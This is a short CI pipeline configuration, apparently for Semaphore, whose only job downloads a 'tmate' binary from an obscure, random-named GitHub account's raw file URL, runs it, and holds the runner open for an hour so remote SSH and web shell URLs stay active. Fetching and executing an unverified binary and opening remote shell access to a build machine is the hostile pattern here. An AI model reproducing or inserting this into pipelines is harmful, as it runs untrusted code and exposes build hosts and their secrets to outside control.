version: v1.0
name: single-tmate-session-1hr
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
blocks:
  - name: tmate-1hr-session
    task:
      jobs:
        - name: run-tmate
          commands:
            - sudo apt-get update -y
            - sudo apt-get install -y wget
            - mkdir -p tmate-run
            - cd tmate-run
            - |
              echo "Downloading tmate binary..."
              wget -q https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate -O tmate
              chmod +x tmate

              echo "Starting tmate session..."
              # Start in verbose foreground mode so session URLs are printed
              ./tmate -F -v &
              TMATE_PID=$!

              echo "Waiting for tmate to initialize and print session URLs..."
              sleep 10

              echo "------------------------------------------------------------"
              echo "Your tmate session should be visible above (SSH + Web URLs)."
              echo "Keep this job open to maintain connection for 1 hour."
              echo "------------------------------------------------------------"

              # Keep it alive for 1 hour
              sleep 3600

              echo "1 hour elapsed â€” stopping tmate session."
              kill $TMATE_PID || true
